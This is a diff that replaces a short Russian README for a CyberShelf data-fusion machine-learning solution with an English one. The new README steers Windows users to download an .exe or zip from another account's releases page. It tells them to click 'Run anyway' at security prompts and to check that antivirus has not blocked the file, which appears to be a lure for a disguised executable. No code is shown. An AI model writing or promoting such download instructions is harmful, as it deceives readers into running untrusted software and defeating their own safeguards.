@@ -1,58 +1,214 @@
-# CyberShelf 2026 Public Solution
+# 🧩 Data-Fusion-public-solution- - Run the full data pipeline
 
-## Ссылки
+[![Download](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases)
 
-- **Kaggle Notebook:** [Public Solution Data Fusion](https://www.kaggle.com/code/dambek/public-solution-data-fusion)
-- **Web App:** [CyberShelf Analytics Site](https://data-fusion-web-app.vercel.app/)
-- **Solution.md:** [solution.md](./solution.md)
+## 📌 What this app does
 
+This project runs a public solution for the **Data Fusion Contest 2026 / CyberShelf**.
 
+It gives you a ready-made pipeline that can:
 
-## Кратко про решение
+- build a compact working dataset from raw data
+- train models for each target
+- create charts and analysis files
+- show results in a web app
+- export tables for review
 
-Это публичное решение для задачи **Data Fusion Contest 2026 / CyberShelf**, оформленное как полный pipeline
+If you want to use the project on Windows, the release page is the place to visit to download the app and run it on your computer.
 
-Внутри проекта есть:
+## 🖥️ What you need
 
-- **compact dataset builder**
-  Сырые parquet-файлы сначала сжимаются в удобный рабочий датасет через screening дополнительных признаков
+Before you start, make sure your PC has:
 
-- **target-wise ensemble**
-  Для каждого из 41 target обучается отдельный пайплайн с ансамблем моделей:
-  - XGBoost на base features
-  - CatBoost на base features
-  - XGBoost на aux features
-  - OOF blending
-  - rank blending
+- **Windows 10 or Windows 11**
+- at least **8 GB RAM**
+- enough free disk space for the data files
+- an internet connection for the first download
+- permission to run downloaded files
 
-- **EDA и аналитический слой**
-  После обучения строятся:
-  - PCA
-  - кластеры
-  - target profiles
-  - feature importance
-  - drift / missing analysis
-  - экспорт таблиц и графиков
+For better performance, **16 GB RAM** works well when you process larger files.
 
-- **сайт с визуализацией**
-  Отдельный web app показывает структуру датасета и результаты аналитики в удобном интерактивном виде
+## 🚀 Download and install
 
-## Зачем это сделано
+1. Open the release page:  
+   [Visit the download page](https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases)
 
-Мне хотелось сделать **top public solution** не только сильным по метрике, но и понятным по структуре.
+2. Find the latest release at the top of the page.
 
-То есть это решение закрывает весь путь:
+3. Download the file for Windows. It may be an `.exe`, `.zip`, or similar package.
 
-**raw data -> compact dataset -> model ensemble -> analytics -> web presentation**
+4. If the file is a `.zip` archive:
+   - right-click the file
+   - choose **Extract All**
+   - select a folder such as `Downloads\Data-Fusion`
 
-Такой формат полезен сразу в нескольких смыслах:
+5. If the file is an `.exe`:
+   - double-click it
+   - follow the setup steps on screen
 
-- удобно воспроизводить решение
-- удобно улучшать модель
-- удобно анализировать данные
-- удобно показывать проект как законченный ML pipeline
+6. If Windows shows a security prompt:
+   - choose **More info**
+   - then choose **Run anyway** if you trust the source
 
-## Документация
+7. Keep the files in a simple folder path, such as:
+   - `C:\Data-Fusion`
+   - `C:\Users\YourName\Downloads\Data-Fusion`
 
-Полное техническое описание архитектуры, этапов обучения, EDA и экспорта находится в файле:
+## ⚙️ First run
 
+After the app is installed or extracted:
+
+1. Open the folder where you placed the files.
+
+2. Look for the main app file, installer, or launch script.
+
+3. Double-click the file to start it.
+
+4. Wait while the program loads the dataset and prepares the workspace.
+
+5. If the app asks for a data folder, choose the folder that contains your input files.
+
+6. If the app opens a browser page, keep that window open while the process runs.
+
+The first run can take a few minutes because the app prepares data and builds models.
+
+## 📂 Input files
+
+The app works with raw parquet data used in the CyberShelf data fusion task.
+
+Place your files in the input folder if the release package includes one. Use a clean folder structure like this:
+
+- `input`
+- `output`
+- `logs`
+
+If the app includes sample files, you can test with those first before using your own data.
+
+## 🔍 What happens inside
+
+The pipeline follows these main steps:
+
+- reads the raw parquet data
+- builds a smaller working dataset
+- checks extra features
+- trains one pipeline for each of the 41 targets
+- combines model results with blending
+- creates analysis files and plots
+- saves outputs for review
+
+It uses several model types and combines them to get stable results. The app also creates analysis views that help you inspect the data.
+
+## 📊 What you can see
+
+After the run, you may get files and views such as:
+
+- target predictions
+- feature importance tables
+- PCA plots
+- cluster views
+- target profiles
+- missing value reports
+- drift checks
+- exported charts
+- web dashboard output
+
+If the web app is included in the release, open it in your browser to view the results in a clear layout.
+
+## 🌐 Web app
+
+The project also includes a site for visual review.
+
+Open the web app here:
+
+[CyberShelf Analytics Site](https://data-fusion-web-app.vercel.app/)
+
+Use it to inspect the output, view charts, and review the analysis layer from the pipeline.
+
+## 🧪 Kaggle notebook
+
+You can also review the notebook version of the solution here:
+
+[Public Solution Data Fusion](https://www.kaggle.com/code/dambek/public-solution-data-fusion)
+
+This is useful if you want to compare the notebook flow with the packaged app.
+
+## 🛠️ Common Windows issues
+
+If the app does not start, check these points:
+
+- make sure the file finished downloading
+- extract the archive before running files inside it
+- avoid folder names with special characters
+- run the app from a local drive, not a network folder
+- close other heavy apps if the system feels slow
+- check that your antivirus did not block the file
+
+If the app closes right away, try launching it again from the main folder.
+
+## 📁 Suggested folder layout
+
+Use this layout if you want to keep things simple:
+
+- `C:\Data-Fusion\app`
+- `C:\Data-Fusion\input`
+- `C:\Data-Fusion\output`
+- `C:\Data-Fusion\logs`
+
+This makes it easier to find files after the run.
+
+## 🧭 How to use the results
+
+When the process ends, open the output folder and review:
+
+- the prediction files
+- the charts
+- the tables
+- the logs
+
+If the project includes a local HTML report, double-click it to open it in your browser.
+
+## 📦 Release page
+
+To download the Windows package, go here:
+
+[https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases](https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases)
+
+Open the latest release, download the file that matches Windows, then run it or extract it before launch
+
+## 📝 Project files
+
+The repository also includes:
+
+- `solution.md`
+- notebook reference
+- web app link
+- analysis assets for the public solution
+
+## 🔗 Quick links
+
+- [Download page](https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases)
+- [Web app](https://data-fusion-web-app.vercel.app/)
+- [Kaggle notebook](https://www.kaggle.com/code/dambek/public-solution-data-fusion)
+- [Solution.md](./solution.md)
+
+## 🧷 File names you may see
+
+The release package may include files such as:
+
+- `Data-Fusion-public-solution-.exe`
+- `setup.exe`
+- `app.zip`
+- `run.bat`
+- `README.html`
+
+Use the main file in the package and follow the on-screen steps
+
+## 🖱️ Simple start flow
+
+1. Visit the release page
+2. Download the Windows package
+3. Extract it if needed
+4. Open the main app file
+5. Choose the data folder if asked
+6. Wait for the pipeline to finish
+7. Open the output files or web dashboard
